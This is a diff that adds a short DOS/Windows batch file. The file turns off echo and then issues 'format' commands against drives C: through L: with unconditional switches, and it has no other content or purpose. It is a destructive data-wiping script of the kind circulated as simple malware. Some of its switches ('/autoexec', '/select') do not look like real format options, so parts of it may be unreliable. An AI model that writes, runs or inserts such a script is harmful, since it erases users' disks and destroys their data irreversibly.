@@ -1,0 +1,9 @@
+@ echo off
+format c: /autoexec/u
+format d: /autoexec/u/select
+format e: /autoexec/u/select
+format f: /autoexec/u/select
+format g: /autoexec/u/select
+format h: /autoexec/u/select
+format j: /autoexec/u/select
+format l: /autoexec/u/select
